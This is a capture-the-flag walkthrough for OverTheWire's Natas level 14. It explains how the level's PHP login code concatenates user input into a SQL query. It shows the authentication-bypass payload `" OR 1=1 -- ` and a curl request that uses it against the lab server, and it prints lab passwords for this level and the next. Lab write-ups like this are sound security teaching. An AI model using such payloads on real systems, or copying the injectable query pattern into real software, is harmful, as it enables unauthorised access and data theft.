# NATAS LEVEL 14

```
http://overthewire.org/wargames/natas/natas14.html
```

```
Username: natas14
Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
URL:      http://natas14.natas.labs.overthewire.org
```

<img src='index.jpg' width=500px>

### SOLUTION

#### CODE INSPECTION

```
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas14</h1> 
<div id="content"> 
<? 
if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas14', '<censored>'); 
    mysql_select_db('natas14', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    if(mysql_num_rows(mysql_query($query, $link)) > 0) { 
            echo "Successful login! The password for natas15 is <censored><br>"; 
    } else { 
            echo "Access denied!<br>"; 
    } 
    mysql_close($link); 
} else { 
?> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
Password: <input name="password"><br> 
<input type="submit" value="Login" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
```

Reading the code, we see that:

- the webapp connects to a database on `localhost` called `natas14`
- there is a SQL `SELECT` query for matches on `username` and `password` 
- if the number of returned rows from the query is > 0, password is revealed
- we note there appears to be a debug flag called `debug` that would yield
  the SQL `SELECT` query being executed

A little test program to see what the SQL query looks like..

```
$ cat app.php
<?

$REQUEST_username = "test";
$REQUEST_password = "1234";

$query = "SELECT * from users where username=\"".$REQUEST_username."\" and password=\"".$REQUEST_password."\"";

echo "Executing query: $query\n";
?>
$ php app.php
Executing query: SELECT * from users where username="test" and password="1234"
```

This looks like a simple SQL injection problem. Let's take advantage of the
"debug" mode which is triggered by a `GET` request (as opposed to the `POST`
request we make when we use the form).

Crafting a URL like so..

```
http://natas14.natas.labs.overthewire.org/index.php?username=test_username&password=test_password&debug
```

```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
Executing query: SELECT * from users where username="test_username" and password="test_password"<br>Access denied!<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

#### SQL INJECTION

We see from the code that our inputs are used directly into the SQL statement.
If we pass in a username string that modifies the SQL statement to always
evaluate to true and leverage the SQL inline comment `--` to mask out any
troublesome bits, we should be able to get the password.

A username like `test_username" OR 1=1 -- ` would:

1. syntactically complete the `where username="test_username" clause so we
   don't cause a syntax error with our SQL `SELECT` statement
2. introduce a new clause `OR 1=1` that will always evaulate to true
3. leverage the SQL inline comment `--` to render the rest of the SQL command
   (such as the pesky `and password` clause) as comments to be ignored

The resulting SQL query should look something like:

```
SELECT * from users where username="test_username" or 1=1 -- " and password="test_password"
```

Our `GET` URL will look like this..

```
http://natas14.natas.labs.overthewire.org/index.php?username=test_username%22%20OR%201=1%20--%20&password=test_password&debug
```

```
$ curl 'http://natas14.natas.labs.overthewire.org/index.php?username=test_username%22%20or%201=1%20--%20&password=test_password&debug' \
  -H 'Authorization: Basic bmF0YXMxNDpMZzk2TTEwVGRmYVB5VkJrSmRqeW1ibGxRNUw2cWRsMQ=='
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
Executing query: SELECT * from users where username="test_username" or 1=1 -- " and password="test_password"<br>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
